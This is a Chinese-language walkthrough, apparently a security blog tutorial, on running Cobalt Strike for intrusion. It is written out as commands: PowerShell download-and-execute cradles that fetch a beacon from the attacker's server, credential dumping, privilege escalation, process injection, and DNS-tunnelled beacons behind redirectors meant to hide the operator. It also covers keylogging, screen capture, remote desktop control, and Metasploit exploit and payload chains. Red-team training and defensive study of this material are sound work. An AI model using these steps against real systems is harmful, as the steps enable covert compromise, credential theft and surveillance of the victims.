Cobalt Strike 是一款远程控制工具，适合在团队模式下模拟 APT
在攻防对抗中进行内网渗透。同时它还集成了端口转发、服务扫描、自动化溢出利用、多模式端口监听、多种木马生成等功能，甚至包括克隆站点获取浏览器信息。本文主要介绍
CS 的基础使用。

## 0x01 基础使用

### 工具架构

CobaltStrike 主要采用 C/S
架构，服务端支持团队协作操作，提供各种攻击所需的服务，比如设置监听器、生成各种木马、保存各类日志等；而客户端供团队成员使用，只需配置完服务器IP、服务器监听端口及账号密码即可连接成功。以下是关于架构的可视化图：  
![1](https://image.3001.net/images/20230625/1687663863_6497b4f78e5ab5705abe6.png!small)

在服务器上开启服务端，后面两个参数分别是服务器主机IP以及连接密码

./teamserver 192.168.8.104 123456

在本地启动客户端配置服务器地址和连接端口并输入账号密码  
![3](https://image.3001.net/images/20230625/1687663864_6497b4f8b818db332dbcd.png!small)

成功连接服务器，不过需注意的是客户端与服务端版本要一致  
![4](https://image.3001.net/images/20230625/1687663865_6497b4f9f29b81c48208a.png!small)

启动客户端登录另一个账号，两账号之间通话非常方便，适合团队协作  
![6](https://image.3001.net/images/20230625/1687663867_6497b4fb5a94e315c801d.png!small)

### 简单上线

设置 HTTP 类型监听器  
![7](https://image.3001.net/images/20230625/1687663868_6497b4fcc3e2cd81465b0.png!small)

选择钓鱼攻击中的 WEB 脚本传递  
![8](https://image.3001.net/images/20230625/1687663870_6497b4fe03078bd57dbbc.png!small)

设置对应的路径、主机地址、主机端口、监听器以及脚本执行类型  
![9](https://image.3001.net/images/20230625/1687663871_6497b4ff382d7afe5d7b7.png!small)

访问网站对应路径，出现界面如下说明启动成功  
![10](https://image.3001.net/images/20230625/1687663872_6497b500e575cc76bdbb3.png!small)

在靶机中执行 PowerShell 类型脚本命令，成功上线 CS

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.8.104:80/a'))"
    

![11](https://image.3001.net/images/20230625/1687663874_6497b502d09ae4dc64380.png!small)

### 简单利用

获取明文密码和用户密码哈希

    
    
    logonpasswords
    hashdump
    

![12](https://image.3001.net/images/20230625/1687663876_6497b50416775866288e9.png!small)

成功提升至系统权限

    
    
    getsystem
    

生成 HTTP 监听器的`payload.bin`  
![](https://image.3001.net/images/20230625/1687663877_6497b50590be15e284174.png!small)

查看进程并选择系统权限的`svchost`进程注入

    
    
    shinject 732 x64
    

![](https://image.3001.net/images/20230625/1687663878_6497b506dabea07cc54a7.png!small)

成功注入并上线系统权限  
![](https://image.3001.net/images/20230625/1687663880_6497b508c8589f451ac76.png!small)

## 0x02 DNS监听器

### 重定器介绍

重定器是在服务器和目标网络之间的服务器，它的主要作用是对团队服务器进行任意的连接或返回，即通常说的代理服务器或端口转发工具，在 APT
攻击和防御中扮演着非常重要的角色，它主要提供了以下两种功能：

  * 保护 CobaltStrike 服务器地址，防止受害者溯源至服务器 IP

  * 提升冗余能力，如果服务器存在连接问题也能够进行通信

通过 DNS
服务器进行域名解析后访问目标网站测试重定向是否正常，通过浏览器依次访问`http://r1.cs.com/a`、`http://r2.cs.com/b`、`http://r3.cs.com/c`，并在服务器中创建监听器并设置
web 传递，等待目标执行命令  
![1](https://image.3001.net/images/20230625/1687663882_6497b50a15f552c0a5d99.png!small)

另外还要介绍一款工具：socat，主要用于端口重定向，安装过程也非常简单

    
    
    apt-get install socat
    

使用 socat 进行端口重定向

    
    
    例：socat TCP4-LISTEN:80 , fork TCP4:[team server]:80
    socat TCP4-LISTEN:80, fork TCP4:team.cs.com:80
    

### DNS监听利用

搭建 DNS 服务器并配置信息，同时设置角色名分别如下：

    
    
    cs.com 192.168.8.104
    r1.cs.com 192.168.8.233
    r2.cs.com 192.168.8.240
    r3.cs.com 192.168.8.211
    

![3](https://image.3001.net/images/20230625/1687663883_6497b50b8789ea22a320e.png!small)

在靶机上设置 DNS 服务器为`192.168.8.212`  
![4](https://image.3001.net/images/20230625/1687663884_6497b50c717e3f5f4dbba.png!small)  
`r1.cs.com`成功 ping 通`cs.com`  
![5](https://image.3001.net/images/20230625/1687663885_6497b50d7fa5feced6d20.png!small)  
`r2.cs.com`成功 ping 通`cs.com`  
![6](https://image.3001.net/images/20230625/1687663886_6497b50e66de06d80d687.png!small)  
在 ubuntu 上建立 socat 转发

    
    
    安装socat：
    命令：socat TCP-LISTEN:80,fork TCP4:cs.com:80
    

![7](https://image.3001.net/images/20230625/1687663887_6497b50f627a04a05aeda.png!small)

设置监听器需配置 host 域名

    
    
    r1.cs.com
    r2.cs.com
    r3.cs.com
    

![9](https://image.3001.net/images/20230625/1687663888_6497b5106b54c1bb3b04e.png!small)

设置 WEB 脚本生成用于攻击的 payload  
![10](https://image.3001.net/images/20230625/1687663889_6497b5118d3b7c231510f.png!small)

访问网站对应 URL 出现页面如下，说明成功启动  
![11](https://image.3001.net/images/20230625/1687663890_6497b512d2a6e953f4ad2.png!small)  
在靶机中执行脚本

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://r2.cs.com:80/a'))"
    

![12](https://image.3001.net/images/20230625/1687663892_6497b51472d1d95207d29.png!small)  
成功上线 CS  
![13](https://image.3001.net/images/20230625/1687663893_6497b5158ac87c1c5d900.png!small)

### DNS木马简介

使用 DNS 木马的优点是隐蔽性相对较好，在受害主机上不会开放多余端口，通信流量只会走53端口，能够有效规避防火墙，而缺点也十分明显，由于使用 DNS
协议，传输过程需要经 DNS 服务器解析至目标 IP，导致响应相对较慢。在 CS 上存在两种 DNS 木马类型，分别如下：

  * beacon_dns/reverse_http：传输数据小，payload通过http分阶段，将http改为dns的a记录进行通信，但速度较慢，非常隐蔽，推荐使用

  * beacon_dns/reverse_dns_txt：传输数据大，同上只是使用dns的txt方式进行通信，相比上一种传输的数据量更大

受害主机在执行 DNS 木马后会发出a记录的请求，如果本地 hosts 文件存在记录就能拿到返回 IP
地址，而不存在就会请求根服务器，还不存在就会依次访问`com`、`dnspot`的域名解析服务器，最终会找到名称服务器，名称服务器可以是 CS
服务器，如果存在解析记录就会返回对应域名的 IP 地址，同时还会返回 DNS 信息给受害者，受害者再请求危险的a记录到 CS 服务器，从而完成通信。

### DNS隧道利用

![2](https://image.3001.net/images/20230625/1687663895_6497b5173cf9716aae0f0.png!small)  
在 VPS 控制台上指定子域名 DNS 记录，其中 test 指向 VPS 的IP地址，完成后把 c1、c2、c3 都指向 test.maccc.top  
![1](https://image.3001.net/images/20230625/1687663896_6497b51863c307f09443d.png!small)

新建监听器并配置 payload 为windows/beacon_dns/reverse_http，DNS
地址指向test.maccc.top，DNS地址为c1.maccc.top、c2.maccc.top、c3.maccc.top  
![6](https://image.3001.net/images/20230625/1687663897_6497b5199d79bcdb25a74.png!small)

测试 test.maccc.top是否已经成功解析

    
    
    nslookup test.maccc.top
    nslookup 123456.c1.maccc.top 123456任意
    dig/trace 123456.c1.maccc.top
    

![8](https://image.3001.net/images/20230625/1687663899_6497b51b09c4b56f9a9e4.png!small)

设置 WEB 脚本生成用于攻击的 payload  
![7](https://image.3001.net/images/20230625/1687663900_6497b51c32ad36907cb4e.png!small)

在客户端和服务端分别测试连通性

    
    
    服务端：tcpdump -n -i eth0 udp dst port 53
    客户端：nslookup 123456.c1.maccc.top
    

![10](https://image.3001.net/images/20230625/1687663901_6497b51d6d76a507dc238.png!small)

在受害主机中执行命令成功上线

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://test.maccc.top:80/a'))"
    

通过`mode`命令转换传输协议为 HTTP

    
    
    mode http dns dns-txt
    

## 0x03 用户驱动管理

### 驱动模块简介

当上线后攻击者可利用驱动模块对目标发起攻击，包括屏幕截图、键盘记录、进程处理、端口扫描、用户发现、文件管理、远程vnc、浏览器代理（仅针对IE）等，相关命令包括如下：

    
    
    sleep <time> #控制响应时间间隔（秒）
    portscan #端口扫描
    jobs #查看任务列表
    jobkill <jid> #终止任务
    

### 常用驱动模块

选择目标右键进入会话交互  
![1](https://image.3001.net/images/20230625/1687663903_6497b51f05ae55edb0090.png!small)

在会话中使用屏幕截图功能

    
    
    screenshot
    

![2](https://image.3001.net/images/20230625/1687663904_6497b52015b720da04916.png!small)

在屏幕截图模块中查看截取的屏幕  
![3](https://image.3001.net/images/20230625/1687663905_6497b5216969a0aa332e4.png!small)  
在会话中选择用户进程进行键盘记录

    
    
    keylogger 2740 x64
    

![4](https://image.3001.net/images/20230625/1687663906_6497b522801a2af41f7c3.png!small)

在键盘记录模块中查看进程用户输入  
![5](https://image.3001.net/images/20230625/1687663908_6497b524316cb795fb66f.png!small)

在文件管理模块查看主机任意磁盘文件  
![6](https://image.3001.net/images/20230625/1687663910_6497b526961044c998b1f.png!small)  
如果想要控制桌面可使用 vnc 桌面交互模块

    
    
    desktop
    

![7](https://image.3001.net/images/20230625/1687663912_6497b5284f2e380ec562b.png!small)

攻击者可选择控制屏幕或仅监控屏幕  
![8](https://image.3001.net/images/20230625/1687663913_6497b5299158eb7e0fd93.png!small)  
使用浏览器代理功能  
![9](https://image.3001.net/images/20230625/1687663915_6497b52b2673d23b9d877.png!small)

在浏览器代理模块发现已成功启用  
![10](https://image.3001.net/images/20230625/1687663916_6497b52c5d2e6e3c6a72b.png!small)

使用端口扫描扫描本地或局域网目标

    
    
    例：portscan [ip] [port] [type] [size]
    portscan 192.168.8.0-192.168.8.255 1-1024,3389.5000-6000 arp 1024
    

![11](https://image.3001.net/images/20230625/1687663917_6497b52dbd7b34751790a.png!small)

在目标主机中会显示成功扫描到的主机IP  
![12](https://image.3001.net/images/20230625/1687663918_6497b52ee112c4e02d86d.png!small)

### 会话管理模块

CS 和 MSF 是日常渗透活动中使用最主要的两款远程控制的工具，会话管理功能能够实现两者会话自由转换。CS 能够派生自身会话，还能派生其他 CS
服务器做备份会话；而 MSF 能生成木马与 CS 建立会话，也能利用 EXP 与 CS 建立会话，当然也可以派生会话至 CS

#### CS派生自身会话

首先给自身派生会话  
![1](https://image.3001.net/images/20230625/1687663920_6497b5300a2a91ac6bee3.png!small)

生成新监听器为`http_beacon_2`  
![2](https://image.3001.net/images/20230625/1687663921_6497b531116c87dfc3312.png!small)  
选择主机新建会话  
![3](https://image.3001.net/images/20230625/1687663922_6497b53242c57daddfd71.png!small)

选择新监听器`http_beacon_2`  
![4](https://image.3001.net/images/20230625/1687663923_6497b53397d79275ec693.png!small)

成功生成两个会话  
![5](https://image.3001.net/images/20230625/1687663924_6497b534e9675a90493c5.png!small)  
成功生成三个会话  
![6](https://image.3001.net/images/20230625/1687663926_6497b53614f9eebb09222.png!small)

#### CS派生备份会话

在 A 服务器上生成新监听器  
![7](https://image.3001.net/images/20230625/1687663927_6497b5373addeb85a1615.png!small)

B 服务器上存在会话，同时生成新监听器，配置 IP 地址为 A 服务器对应地址和端口  
![8](https://image.3001.net/images/20230625/1687663928_6497b5386add5b0fd11ab.png!small)  
在已有会话中派生会话，选择新监听器`http_beacon_team`  
![9](https://image.3001.net/images/20230625/1687663929_6497b53964633ea0f6520.png!small)

成功派生会话  
![10](https://image.3001.net/images/20230625/1687663930_6497b53a7c9dc737a07fc.png!small)

#### CS派生MSF会话

在 MSF 中配置监听

    
    
    msf5 > use exploit/multi/handler
    msf5  exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
    msf5 exploit(multi/handler) > set lhost 192.168.8.222
    msf5 exploit(multi/handler) > set lport 4444
    

设置监听器为 MSF 服务器地址和端口  
![11](https://image.3001.net/images/20230625/1687663903_6497b51f05ae55edb0090.png!small)

但选择新监听器派生后能反弹meterpreter，但不能执行命令，可能是系统不兼容64位

#### MSF生成木马上线CS

使用 MSF 生成木马与CS建立会话

msfvenom -p windows/meterpreter/reverse_http lhost=192.168.8.222 lport=5555 -f
exe > ~/Desktop/shell.exe

建立监听器  
![12](https://image.3001.net/images/20230625/1687663904_6497b52015b720da04916.png!small)

执行木马成功上线 CS

![13](https://image.3001.net/images/20230625/1687663905_6497b5216969a0aa332e4.png!small)

#### MSF执行溢出上线CS

在 CS 上设置新监听器  
![14](https://image.3001.net/images/20230625/1687663906_6497b522801a2af41f7c3.png!small)

在 MSF 使用溢出漏洞上线 CS

    
    
    use exploit/windows/browser/ms14_064_ole_code_execution
    set srvhost 192.168.8.139
    set SRVPORT 80
    set payload windows/meterpreter/reverse_http
    set LHOST 192.168.8.222
    set lport 8888
    set disablepayloadhandler True
    set PrependMigrate True
    exploit
    

  * disablepayloadhandler True：不需要在框架内来创建处理程序来服务有效载荷连接

  * PrependMigrate True：MSF 修改 stager 以便利用之后立即迁移到另一个进程

#### MSF派生CS会话

在 MSF 中通过溢出漏洞上线管理员

    
    
    use exploit/windows/browser/ms14_064_ole_code_execution
    set srvhost 192.168.8.134
    set SRVPORT 80
    set payload windows/meterpreter/reverse_tcpset 
    set rhosts 192.168.0.134
    set lport 4444
    exploit
    

![15](https://image.3001.net/images/20230625/1687663908_6497b524316cb795fb66f.png!small)  
把当前会话派生给 CS

    
    
    use exploit/windows/local/payload_inject
    set session 3
    set payload windows/meterpreter/reverse_http
    set lhsot 192.168.8.222
    set lport 8888
    set DisablePayloadHandler true
    exploit -j
    

![16](https://image.3001.net/images/20230625/1687663910_6497b526961044c998b1f.png!small)

成功派生会话给CS  
![17](https://image.3001.net/images/20230625/1687663912_6497b5284f2e380ec562b.png!small)

